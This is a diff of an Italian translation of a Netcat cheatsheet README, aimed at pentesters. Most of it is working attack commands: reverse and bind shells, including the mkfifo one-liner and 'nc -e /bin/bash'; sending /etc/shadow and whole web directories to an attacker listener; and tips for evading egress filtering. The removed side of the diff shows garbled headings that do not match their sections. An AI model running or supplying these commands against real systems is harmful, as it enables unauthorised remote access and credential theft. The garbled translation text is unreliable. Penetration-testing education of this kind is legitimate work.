@@ -1,12 +1,16 @@
-# 🔌 Netcat - Scheda di riferimento completa
-
 <!-- language-home-navigation -->
-[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🔌 Netcat (nc) - Cheatsheet completo
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
   ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
@@ -16,63 +20,61 @@
   ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
        The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
 ```
-
-<p align="center">
+<palign="centro">
   <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
-  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
-  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocols TCP/UDP">
-  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
+  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Sfruttamento e conchiglie">
+  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocolli TCP/UDP">
+  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="Licenza">
 </p>
 
-<p align="center">
-  <b>🌐 Read and write raw data across network connections using TCP and UDP protocols</b>
+<palign="centro">
+  <b>🌐 Leggi e scrivi dati grezzi attraverso connessioni di rete utilizzando i protocolli TCP e UDP</b>
 </p>
 
 ---
 
-## 📋 Indice
+## 📋 Sommario
 
-- [Introduzione](#-overview--the-netcat-philosophy)
-- [Netcat Variants & The Flavor Dilemma](#-netcat-variants--the-flavor-dilemma)
-  - [⚖️ Netcat Variants & The Flavor Dilemma](#openbsd-netcat-ncopenbsd)
-  - [Default on**: Kali Linux, Debian, Ubuntu, Linux Mint.](#traditional-netcat-nctraditional)
-  - [Traditional Netcat (`nc.traditional`)](#nmap-ncat-ncat)
-- [Tool Comparison: Netcat Variants vs Socat](#-tool-comparison-netcat-variants-vs-socat)
-- [Installazione](#-installation--switching-variants)
-- [Opzioni e parametri](#-core-command-line-flags)
-- [Port Scanning & Banner Grabbing](#-port-scanning--banner-grabbing)
-- [Reverse & Bind Shells](#-reverse--bind-shells)
-  - [Traditional Shell Execution (`-e`)](#traditional-shell-execution--e)
-  - [Traditional Shell Execution (`-e`)](#openbsd-fifo-named-pipe-reverse-shell)
-  - [1. `rm -f /tmp/f`: Removes any stale pipe file.](#openbsd-fifo-bind-shell)
-  - [OpenBSD FIFO Bind Shell](#encrypted-tls-shell-with-ncat---ssl)
-- [File Transfer Techniques](#-file-transfer-techniques)
-  - [Target to Attacker (Exfiltration)](#target-to-attacker-exfiltration)
-  - [When SSH, SCP, FTP, and SMB are blocked or uninstalled, Netcat provides an instant, bidirectional file transfer pipeline over any open TCP port.](#attacker-to-target-payload-delivery)
-  - [Integrity Verification (Checksums)](#on-the-fly-directory-archiving-tar--nc)
-- [Port Forwarding & Network Relays](#-port-forwarding--network-relays)
-- [Web Server & Honeypot Emulation](#-web-server--honeypot-emulation)
-- [Network Debugging & Manual Protocol Interaction](#-network-debugging--manual-protocol-interaction)
-- [Riferimento rapido](#-quick-reference-table)
-- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
-- [Legal Disclaimer](#-legal-disclaimer)
-
----
-
-## 🎯 Introduzione
-
-Originally authored in 1995 by **Hobbit**, **Netcat** (often invoked simply as `nc`) is celebrated across the cybersecurity and Unix communities as the **"TCP/IP Swiss Army Knife"**. 
-
-Unlike high-level application protocols or bloated management tools, Netcat does one thing exceptionally well: **it opens raw byte-level network pipes over TCP or UDP sockets and connects them directly to standard input (`stdin`) and standard output (`stdout`)**.
-
-Whether you are listening for reverse shells, establishing covert exfiltration channels, banner grabbing services, transferring files without SMB/FTP, or diagnosing firewall packet filtering, Netcat remains an indispensable utility in every security practitioner's arsenal.
+- [Panoramica e filosofia Netcat](#-panoramica--filosofia-netcat)
+- [Varianti Netcat e dilemma del sapore](#-netcat-variants--the-flavor-dilemma)
+  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
+  - [Netcat tradizionale (`nc.traditional`)](#tradizionale-netcat-nctradizionale)
+  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
+- [Confronto strumenti: varianti Netcat vs Socat](#-tool-comparison-netcat-variants-vs-socat)
+- [Varianti di installazione e cambio](#-installazione--varianti di cambio)
+- [Flag della riga di comando principale](#-core-command-line-flags)
+- [Scansione porta e acquisizione banner](#-port-scanning--acquisizione banner)
+- [Inverti e lega le conchiglie](#-reverse--bind-shells)
+  - [Esecuzione della shell tradizionale (`-e`)](#esecuzione-della-shell-tradizionale--e)
+  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
+  - [Shell di associazione FIFO OpenBSD](#openbsd-fifo-bind-shell)
+  - [Shell TLS crittografata con Ncat (`--ssl`)](#shell-tls-crittografata-con-ncat---ssl)
+- [Tecniche di trasferimento file](#-tecniche-di-trasferimento-file)
+  - [Obiettivo dell'attaccante (estrazione)](#obiettivo-dell'attaccante-esfiltrazione)
+  - [Attaccante al bersaglio (consegna del carico utile)](#attaccante-al-bersaglio-consegna del carico utile)
+  - [Archiviazione al volo delle directory (`tar + nc`)](#archiviazione-al-volo-delle-directory-tar--nc)
+- [Inoltro porte e relè di rete](#-port-forwarding--network-relay)
+- [Emulazione server Web e honeypot](#-web-server--emulazione-honeypot)
+- [Debug di rete e interazione manuale del protocollo](#-network-debugging--manual-protocol-interaction)
+- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
+- [Considerazioni difensive e OPSEC](#-considerazioni-difensive--opsec)
+- [Disclaimer legale](#-legal-disclaimer)
 
 ---
 
-## ⚖️ Netcat Variants & The Flavor Dilemma
+## 🎯 Panoramica e filosofia Netcat
 
-One of the most frequent sources of confusion during penetration tests and CTF challenges is that **multiple distinct implementations share the `nc` command**. Understanding which variant you are interacting with dictates the syntax and payload possibilities.
+Originariamente scritto nel 1995 da **Hobbit**, **Netcat** (spesso invocato semplicemente come `nc`) è celebrato nelle comunità di sicurezza informatica e Unix come il **"TCP/IP Swiss Army Knife"**. 
 
+A differenza dei protocolli applicativi di alto livello o degli strumenti di gestione sovradimensionati, Netcat fa una cosa eccezionalmente bene: **apre pipe di rete a livello di byte grezzi su socket TCP o UDP e le collega direttamente all'input standard (`stdin`) e all'output standard (`stdout`)**.
+
+Che tu stia ascoltando shell inverse, stabilendo canali di esfiltrazione nascosti, servizi di cattura di banner, trasferendo file senza SMB/FTP o diagnosticando il filtraggio dei pacchetti del firewall, Netcat rimane un'utilità indispensabile nell'arsenale di ogni professionista della sicurezza.
+
+---
+
+## ⚖️ Varianti Netcat e il dilemma del sapore
+
+Una delle fonti di confusione più frequenti durante i penetration test e le sfide CTF è che **più implementazioni distinte condividono il comando `nc`**. Capire con quale variante stai interagendo determina la sintassi e le possibilità di carico utile.
 ```
 +-------------------------------------------------------------------------+
 |                              The nc Command                             |
@@ -87,51 +89,48 @@ One of the most frequent sources of confusion during penetration tests and CTF c
 [netcat-openbsd]       [netcat-traditional]          [ncat]
 (No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
 ```
-
-### ⚖️ Netcat Variants & The Flavor Dilemma
-- **Default on**: Kali Linux, Debian, Ubuntu, Linux Mint.
-- **Key trait**: By default, compiled without the `-e` (execute program) flag to prevent trivial arbitrary code execution vulnerabilities.
-- **Identifying syntax**: 
+### OpenBSD Netcat (`nc.openbsd`)
+- **Predefinito su:** Kali Linux, Debian, Ubuntu, Linux Mint.
+- **Caratteristica chiave:** Per impostazione predefinita, compilato senza il flag `-e` (esecuzione del programma) per prevenire banali vulnerabilità legate all'esecuzione di codice arbitrario.
+- **Identificazione della sintassi:**
   ```bash
   nc -h 2>&1 | grep -i "OpenBSD"
   # Output: OpenBSD netcat (Debian patchlevel ...)
   ```
-- **Shell execution workaround**: Uses Linux named pipes (`mkfifo`) to bridge `stdin` and `stdout` back into `/bin/sh`.
+- **Soluzione alternativa per l'esecuzione della shell:** utilizza le pipe denominate Linux (`mkfifo`) per collegare `stdin` e `stdout` a `/bin/sh`.
 
-### Default on**: Kali Linux, Debian, Ubuntu, Linux Mint.
-- **Original author**: Hobbit (v1.10).
-- **Key trait**: Compiled with the `-DGAPING_SECURITY_HOLE` directive, allowing the native `-e` / `-c` flag (`nc -e /bin/bash`).
-- **Identifying syntax**: 
+### Netcat tradizionale (`nc.traditional`)
+- **Autore originale:** Hobbit (v1.10).
+- **Caratteristiche principali:** Compilato con la direttiva `-DGAPING_SECURITY_HOLE`, che consente il flag nativo `-e` / `-c` (`nc -e /bin/bash`).
+- **Identificazione della sintassi:**
   ```bash
   nc -h 2>&1 | grep -i "GAPING"
   ```
-
-### Traditional Netcat (`nc.traditional`)
-- **Maintained by**: Gordon Lyon (Fyodor) / The Nmap Project.
-- **Key trait**: A modern rewrite supporting **TLS/SSL encryption**, IP access control lists (`--allow`, `--deny`), connection brokering (`--broker`), SOCKS4/5 proxying, and cross-platform native execution.
-
----
-
-## ⚖️ Tool Comparison: Netcat Variants vs Socat
-
-|Feature|`netcat-openbsd`|`netcat-traditional`|`ncat` (Nmap)|`socat`|
-|---------|------------------|----------------------|---------------|---------|
-|**Executable Flag (`-e`)**|❌ Stripped|✅ Native (`-e`)|✅ Native (`-e`, `--exec`)|✅ Native (`EXEC:`)|
-|**SSL / TLS Encryption**|❌ No|❌ No|✅ Native (`--ssl`)|✅ Native (`OPENSSL:`)|
-|**FIFO Pipe Shells**|✅ Yes (`mkfifo`)|✅ Yes|✅ Yes|✅ Yes|
-|**Port Scanning Mode**|✅ Yes (`-z`)|✅ Yes (`-z`)|❌ No|❌ No|
-|**Persistent Listener**|✅ Yes (`-k`)|❌ No (Exits on disconnect)|✅ Yes (`-k`, `--keep-open`)|✅ Yes (`fork`)|
-|**IPv6 Support**|✅ Native (`-6`)|❌ Limited|✅ Native (`-6`)|✅ Native|
-|**Proxy / SOCKS Client**|✅ Yes (`-X`, `-x`)|❌ No|✅ Yes (`--proxy`)|✅ Full Proxy support|
-|**Multi-Client Chat / Broker**|❌ No|❌ No|✅ Native (`--broker`)|❌ Manual setup|
-|**Default on Kali / Debian**|✅ Yes (`/bin/nc`)|🔄 Available (`apt`)|🔄 Available (`ncat`)|🔄 Available (`socat`)|
+### Nmap Ncat (`ncat`)
+- **Mantenuto da:** Gordon Lyon (Fyodor) / The Nmap Project.
+- **Tratto principale:** Una riscrittura moderna che supporta la **crittografia TLS/SSL**, elenchi di controllo degli accessi IP (`--allow`, `--deny`), brokeraggio della connessione (`--broker`), proxy SOCKS4/5 ed esecuzione nativa multipiattaforma.
 
 ---
 
-## 📥 Installazione
+## ⚖️ Confronto degli strumenti: varianti Netcat vs Socat
 
-|**Default on Kali / Debian**|✅ Yes (`/bin/nc`)|🔄 Available (`apt`)|🔄 Available (`ncat`)|🔄 Available (`socat`)|
+| Caratteristica | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmappa) | `socat` |
+|---------|---------------------------|---------------------||------|---------|
+| **Flag eseguibile (`-e`)** | ❌ Spogliato | ✅ Nativo (`-e`) | ✅ Nativo (`-e`, `--exec`) | ✅ Nativo (`EXEC:`) |
+| **Crittografia SSL/TLS** | ❌No | ❌No | ✅ Nativo (`--ssl`) | ✅ Nativo (`OPENSSL:`) |
+| **Gusci per tubi FIFO** | ✅ Sì (`mkfifo`) | ✅ Sì | ✅ Sì | ✅ Sì |
+| **Modalità di scansione delle porte** | ✅ Sì (`-z`) | ✅ Sì (`-z`) | ❌No | ❌No |
+| **Ascoltatore persistente** | ✅ Sì (`-k`) | ❌ No (esce alla disconnessione) | ✅ Sì (`-k`, `--keep-open`) | ✅ Sì (`fork`) |
+| **Supporto IPv6** | ✅ Nativo (`-6`) | ❌Limitato | ✅ Nativo (`-6`) | ✅Nativo |
+| **Proxy / Client SOCKS** | ✅ Sì (`-X`, `-x`) | ❌No | ✅ Sì (`--proxy`) | ✅ Supporto proxy completo |
+| **Chat multi-cliente/Broker**| ❌No | ❌No | ✅ Nativo (`--broker`) | ❌ Configurazione manuale |
+| **Predefinito su Kali / Debian** | ✅ Sì (`/bin/nc`) | 🔄 Disponibile (`apt`) | 🔄 Disponibile (`ncat`) | 🔄 Disponibile (`socat`) |
 
+---
+
+## 📥 Varianti di installazione e cambio
+
+Sulle distribuzioni basate su Debian (incluso Kali Linux), puoi installare tutte le versioni e passare da una all'altra tramite `update-alternatives`:
 ```bash
 # Install all Netcat implementations
 sudo apt update
@@ -143,8 +142,7 @@ readlink -f /bin/nc
 # Switch default nc binary interactively
 sudo update-alternatives --config nc
 ```
-
-📥 Installazione
+Per eseguire esplicitamente una variante specifica senza modificare le impostazioni predefinite a livello di sistema:
 ```bash
 # Invoke OpenBSD variant directly
 nc.openbsd -lvnp 4444
@@ -155,33 +153,31 @@ nc.traditional -lvnp 4444 -e /bin/bash
 # Invoke Nmap Ncat
 ncat -lvnp 4444 --ssl
 ```
-
 ---
 
-## ⚙️ Opzioni e parametri
+## ⚙️ Flag principali della riga di comando
 
-|Flag|Meaning & Description|
+| Bandiera | Significato e descrizione |
 |------|-----------------------|
-|`-l`|**Listen mode**: Wait for inbound connections instead of initiating outbound.|
-|`-v`|**Verbose mode**: Print detailed connection and diagnostic information (`-vv` for higher verbosity).|
-|`-n`|**Numeric-only IP**: Disable reverse DNS resolution for speed and stealth.|
-|`-p <port>`|**Local port**: Specify the local port to bind or listen on.|
-|`-u`|**UDP mode**: Use UDP protocol instead of the default TCP stream.|
-|`-k`|**Keep listening**: Keep listening and accepting new connections after a client disconnects.|
-|`-w <sec>`|**Timeout**: Timeout in seconds for connection establishment and idle socket reads.|
-|`-z`|**Zero-I/O mode**: Scanning mode; send no payload data and close socket immediately after handshaking.|
-|`-q <sec>`|**Quit after EOF**: Wait specified seconds after receiving EOF on `stdin` before terminating.|
-|`-s <ip>`|**Source IP**: Bind to a specific local interface / source IP address.|
-|`-4` / `-6`|Force IPv4 or IPv6 addressing exclusively.|
+| `-l` | **Modalità di ascolto**: attende le connessioni in entrata invece di avviare quelle in uscita. |
+| `-v` | **Modalità dettagliata**: stampa informazioni dettagliate sulla connessione e sulla diagnostica (`-vv` per una maggiore verbosità). |
+| `-n` | **IP solo numerico**: disabilita la risoluzione DNS inversa per velocità e invisibilità. |
+| `-p <port>` | **Porta locale**: specificare la porta locale su cui eseguire il collegamento o l'ascolto. |
+| `-u` | **Modalità UDP**: utilizza il protocollo UDP invece del flusso TCP predefinito. |
+| `-k` | **Continua ad ascoltare**: continua ad ascoltare e ad accettare nuove connessioni dopo che un client si disconnette. |
+| `-w <sec>` | **Timeout**: timeout in secondi per la creazione della connessione e le letture del socket inattivo. |
+| `-z` | **Modalità Zero I/O**: modalità di scansione; non inviare dati di payload e chiudere il socket immediatamente dopo l'handshaking. |
+| `-q <sec>` | **Esci dopo EOF**: attende i secondi specificati dopo aver ricevuto EOF su `stdin` prima di terminare. |
+| `-s <ip>` | **IP di origine**: associazione a un'interfaccia locale/indirizzo IP di origine specifico. |
+| `-4` / `-6` | Forza esclusivamente l'indirizzamento IPv4 o IPv6. |
 
 ---
 
-## 🔍 Port Scanning & Banner Grabbing
+## 🔍 Scansione delle porte e acquisizione di banner
 
-While dedicated tools like `nmap` or `masscan` are preferred for comprehensive sweeps, Netcat provides an instant, zero-dependency port check when you land on a restricted target.
+Mentre strumenti dedicati come `nmap` o `masscan` sono preferiti per spazzate complete, Netcat fornisce un controllo delle porte istantaneo e senza dipendenza quando si atterra su un bersaglio limitato.
 
-### Fast Port Scanning
-
+### Scansione rapida delle porte
 ```bash
 # TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
 nc -zvn -w 1 192.168.1.100 20-100
@@ -192,11 +188,9 @@ nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389
 # Scan UDP Ports (DNS, SNMP, NTP)
 nc -zvun -w 2 10.10.10.50 53 161 123
 ```
+### Cattura banner di servizio
 
-### Service Banner Grabbing
-
-Fast Port Scanning
-
+L'acquisizione di banner estrae stringhe di versione grezza da demoni remoti per l'identificazione delle vulnerabilità:
 ```bash
 # Banner grab an SSH daemon
 nc -vn 10.10.10.10 22
@@ -210,17 +204,15 @@ nc -vn 10.10.10.10 25
 # Manual HTTP HEAD / GET request
 printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
 ```
-
 ---
 
-## 💀 Reverse & Bind Shells
+## 💀 Inverti e unisci le conchiglie
 
-Connecting a remote command interpreter (`/bin/sh`, `/bin/bash`, `cmd.exe`) over a Netcat socket is one of the most fundamental penetration testing techniques.
+Il collegamento di un interprete di comandi remoti (`/bin/sh`, `/bin/bash`, `cmd.exe`) su un socket Netcat è una delle tecniche di test di penetrazione più fondamentali.
 
-### Traditional Shell Execution (`-e`)
+### Esecuzione tradizionale della shell (`-e`)
 
-💀 Reverse & Bind Shells
-
+Se nel sistema di destinazione è installato `netcat-traditional` o `ncat` con supporto di esecuzione:
 ```bash
 # 1. Attacker sets up a listener
 nc -lvnp 4444
@@ -237,11 +229,9 @@ nc.traditional -lvnp 8888 -e /bin/bash
 # On Attacker:
 nc -vn 10.10.10.50 8888
 ```
+### OpenBSD FIFO Named Pipe Reverse Shell
 
-### Traditional Shell Execution (`-e`)
-
-On modern Debian, Ubuntu, Kali, and Fedora distributions, `nc` lacks the `-e` flag. Use a **FIFO (First-In-First-Out) named pipe** to redirect standard input and standard output:
-
+Nelle moderne distribuzioni Debian, Ubuntu, Kali e Fedora, `nc` non ha il flag `-e`. Utilizza una **pipe denominata FIFO (First-In-First-Out)** per reindirizzare l'input e l'output standard:
 ```bash
 # 1. Attacker sets up listener
 nc -lvnp 4444
@@ -249,18 +239,16 @@ nc -lvnp 4444
 # 2. Target executes named pipe reverse shell
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
 ```
+#### Come funziona la pipeline FIFO:
+1. `rm -f /tmp/f`: rimuove qualsiasi file pipe non aggiornato.
+2. `mkfifo /tmp/f`: crea una pipe FIFO con nome speciale in `/tmp`.
+3. `cat /tmp/f`: legge l'input consegnato nel tubo e lo inoltra a `/bin/sh -i`.
+4. `| /bin/sh -i 2>&1`: genera una shell interattiva, reindirizzando l'errore standard (`stderr`) all'output standard (`stdout`).
+5. `| nc 10.10.14.5 4444 >/tmp/f`: passa l'output della shell attraverso la rete all'aggressore, mentre riscrive le sequenze di tasti di rete ricevute in `/tmp/f`.
 
-#### OpenBSD FIFO Named Pipe Reverse Shell
-1. `rm -f /tmp/f`: Removes any stale pipe file.
-2. `mkfifo /tmp/f`: Creates a special named FIFO pipe in `/tmp`.
-3. `cat /tmp/f`: Reads input delivered into the pipe and forwards it to `/bin/sh -i`.
-4. `|/bin/sh -i 2>&1`: Spawns an interactive shell, redirecting standard error (`stderr`) to standard output (`stdout`).
-5. `|nc 10.10.14.5 4444 >/tmp/f`: Passes the shell output over the network to the attacker, while writing received network keystrokes back into `/tmp/f`.
+### Shell di associazione FIFO di OpenBSD
 
-### 1. `rm -f /tmp/f`: Removes any stale pipe file.
-
-3. `cat /tmp/f`: Reads input delivered into the pipe and forwards it to `/bin/sh -i`.
-
+Quando la destinazione ha un IP pubblico o locale instradabile e le regole del firewall in entrata consentono il traffico:
 ```bash
 # On Victim / Target machine:
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f
@@ -268,11 +256,9 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/
 # On Attacker machine:
 nc -vn 10.10.10.50 8888
 ```
+### Shell TLS crittografata con Ncat (`--ssl`)
 
-### OpenBSD FIFO Bind Shell
-
-When the target has a routable public or local IP and inbound firewall rules permit traffic:
-
+Il traffico Netcat non crittografato può essere ispezionato tramite IDS/IPS e tap di rete. `ncat` supporta la crittografia TLS/SSL in modo nativo:
 ```bash
 # 1. Attacker sets up an SSL encrypted listener
 ncat --ssl -lvnp 4444
@@ -283,15 +269,13 @@ ncat --ssl 10.10.14.5 4444 -e /bin/bash
 # SSL listener with IP Access Control (Whitelisting attacker IP only)
 ncat --ssl -lvnp 4444 --allow 10.10.14.5
 ```
-
 ---
 
-## 📁 File Transfer Techniques
+## 📁 Tecniche di trasferimento file
 
-When SSH, SCP, FTP, and SMB are blocked or uninstalled, Netcat provides an instant, bidirectional file transfer pipeline over any open TCP port.
+Quando SSH, SCP, FTP e SMB vengono bloccati o disinstallati, Netcat fornisce una pipeline di trasferimento file istantanea e bidirezionale su qualsiasi porta TCP aperta.
 
-### Target to Attacker (Exfiltration)
-
+### Obiettivo dell'attaccante (estrazione)
 ```bash
 # 1. Attacker opens a listener and redirects incoming stream to a local file
 nc -lvnp 9001 > loot_passwords.txt
@@ -299,9 +283,7 @@ nc -lvnp 9001 > loot_passwords.txt
 # 2. Target reads sensitive file and sends it to attacker's listener
 nc -vn 10.10.14.5 9001 < /etc/shadow
 ```
-
-### When SSH, SCP, FTP, and SMB are blocked or uninstalled, Netcat provides an instant, bidirectional file transfer pipeline over any open TCP port.
-
+### Dall'attaccante al bersaglio (consegna del carico utile)
 ```bash
 # 1. Attacker hosts the payload file on a listener
 nc -lvnp 9001 < linpeas.sh
@@ -309,20 +291,16 @@ nc -lvnp 9001 < linpeas.sh
 # 2. Target connects and saves the stream to disk
 nc -vn 10.10.14.5 9001 > linpeas.sh
 ```
+### Verifica dell'integrità (checksum)
 
-### Integrity Verification (Checksums)
-
-Attacker to Target (Payload Delivery)
-
+Verifica sempre l'integrità dei byte dopo i trasferimenti Netcat non elaborati:
 ```bash
 # Calculate MD5 on both source and destination machines
 md5sum transferred_file.tar.gz
 ```
+### Archiviazione immediata delle directory (`tar + nc`)
 
-### Integrity Verification (Checksums)
-
-Always verify byte integrity after raw Netcat transfers:
-
+Trasferisci intere strutture di directory senza creare file di archivio temporanei intermedi sul disco della vittima:
 ```bash
 # 1. Attacker listens and extracts incoming tar stream directly
 nc -lvnp 9001 | tar -xzvf - -C /opt/loot/
@@ -330,27 +308,23 @@ nc -lvnp 9001 | tar -xzvf - -C /opt/loot/
 # 2. Target compresses and streams directory across the wire
 tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
 ```
-
 ---
 
-## 🔀 Port Forwarding & Network Relays
+## 🔀 Port forwarding e relè di rete
 
-Netcat can act as a lightweight network relay without requiring SSH port forwarding:
-
+Netcat può agire come un relè di rete leggero senza richiedere il port forwarding SSH:
 ```bash
 # Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
 rm -f /tmp/relay; mkfifo /tmp/relay
 nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
 ```
-
 ---
 
-## 🌐 Web Server & Honeypot Emulation
+## 🌐 Emulazione server Web ed Honeypot
 
-### Minimalist Single-File HTTP Server
+### Server HTTP minimalista a file singolo
 
-Serve a static HTTP payload or capture credentials submitted by browsers:
-
+Fornire un payload HTTP statico o acquisire credenziali inviate dai browser:
 ```bash
 # One-shot HTTP response
 printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80
@@ -361,11 +335,9 @@ while true; do
   nc -lvnp 8080
 done
 ```
+### Chat multi-cliente/broker di messaggi (`ncat`)
 
-### Minimalist Single-File HTTP Server
-
-Serve a static HTTP payload or capture credentials submitted by browsers:
-
+Ncat include una modalità broker integrata, creando una stanza di ritrasmissione ad hoc simile a IRC per gli operatori della squadra rossa:
 ```bash
 # Attacker runs broker on port 5555
 ncat -lvnp 5555 --broker
@@ -373,13 +345,11 @@ ncat -lvnp 5555 --broker
 # Multiple operators connect and broadcast messages to each other
 ncat 10.10.14.5 5555
 ```
-
 ---
 
-## 🛠️ Network Debugging & Manual Protocol Interaction
+## 🛠️ Debug della rete e interazione manuale del protocollo
 
-### Raw SMTP Mail Injection
-
+### Iniezione di posta SMTP non elaborata
 ```bash
 nc -vn mail.target.local 25 <<EOF
 HELO attacker.local
@@ -393,9 +363,7 @@ Please follow the attachment instructions.
 QUIT
 EOF
 ```
-
-### 🛠️ Network Debugging & Manual Protocol Interaction
-
+### Recupero posta POP3 non elaborata
 ```bash
 nc -vn mail.target.local 110
 # Server replies: +OK POP3 server ready
@@ -407,44 +375,43 @@ STAT
 RETR 1
 QUIT
 ```
-
 ---
 
-## ⚡ Riferimento rapido
+## ⚡ Tabella di consultazione rapida
 
-|Objective|Comando|
+| Obiettivo | Comando |
 |-----------|---------|
-|**Standard Listener**|`nc -lvnp <PORT>`|
-|**Persistent Listener**|`nc -lvnp <PORT> -k`|
-|**Connect to Remote Host**|`nc -vn <HOST> <PORT>`|
-|**Connect via UDP**|`nc -u -vn <HOST> <PORT>`|
-|**Port Scan TCP (Fast)**|`nc -zvn -w 1 <HOST> <START>-<END>`|
-|**Port Scan UDP**|`nc -zvun -w 2 <HOST> <PORT>`|
-|**OpenBSD Named Pipe Shell**|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \|/bin/sh -i 2>&1 \|nc <IP> <PORT> >/tmp/f`|
-|**Traditional Shell (`-e`)**|`nc <IP> <PORT> -e /bin/bash`|
-|**Encrypted SSL Shell (`ncat`)**|`ncat --ssl <IP> <PORT> -e /bin/bash`|
-|**Receive File (Exfil Listener)**|`nc -lvnp <PORT> > output_file`|
-|**Send File (Exfil Sender)**|`nc -vn <IP> <PORT> < input_file`|
-|**Stream Folder via Tar**|`tar -czvf - /path \|nc -vn <IP> <PORT>`|
-|**Extract Streamed Folder**|`nc -lvnp <PORT> \|tar -xzvf -`|
-|**Banner Grabbing**|`nc -vn -w 2 <HOST> <PORT>`|
+| **Ascoltatore standard** | `nc -lvnp <PORT>` |
+| **Ascoltatore persistente** | `nc -lvnp <PORT> -k` |
+| **Connetti all'host remoto** | `nc -vn <HOST> <PORT>` |
+| **Connetti tramite UDP** | `nc -u -vn <HOST> <PORT>` |
+| **Scansione porta TCP (veloce)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
+| **Scansione porta UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
+| **Shell per pipe con nome OpenBSD** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
+| **Conchiglia tradizionale (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
+| **Shell SSL crittografata (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
+| **Ricevi file (ascoltatore Exfil)**| `nc -lvnp <PORT> > output_file` |
+| **Invia file (mittente exfil)** | `nc -vn <IP> <PORT> < input_file` |
+| **Cartella streaming tramite Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
+| **Estrai cartella trasmessa in streaming** | `nc -lvnp <PORT> \| tar -xzvf -` |
+| **Afferra banner** | `nc -vn -w 2 <HOST> <PORT>` |
 
 ---
 
-## 🛡️ Defensive Considerations & OPSEC
+## 🛡️ Considerazioni difensive e OPSEC
 
-1. **Unencrypted Cleartext Warning:**
-   - Standard Netcat does **not** employ cryptographic encapsulation. Any passwords, session tokens, or shell commands sent over cleartext `nc` can be extracted by Network Security Monitoring (NSM) sensors (Zeek, Suricata, Wireshark).
-   - Use `ncat --ssl` or wrap traffic inside an SSH/TLS tunnel whenever possible.
-2. **Process Auditing & Sysmon:**
-   - On Linux systems, process execution logging (`auditd`, eBPF, Falco) flags invocations of `nc` containing flags like `-e` or commands creating `/tmp/f` and `mkfifo`.
-   - On Windows, EDR agents routinely flag or quarantine `nc.exe` binaries due to known static signatures.
-3. **Firewall Inbound Restrictions:**
-   - Always choose common outbound ports (`80`, `443`, `53`) when configuring reverse shell listeners to circumvent strict egress filtering policies.
+1. **Avviso di testo in chiaro non crittografato:**
+   - Netcat standard **non** utilizza l'incapsulamento crittografico. Qualsiasi password, token di sessione o comando shell inviato tramite testo in chiaro `nc` può essere estratto dai sensori NSM (Network Security Monitoring) (Zeek, Suricata, Wireshark).
+   - Utilizzare `ncat --ssl` o avvolgere il traffico all'interno di un tunnel SSH/TLS quando possibile.
+2. **Audit di processo e sistema:**
+   - Sui sistemi Linux, la registrazione dell'esecuzione del processo (`auditd`, eBPF, Falco) segnala le invocazioni di `nc` contenenti flag come `-e` o comandi che creano `/tmp/f` e `mkfifo`.
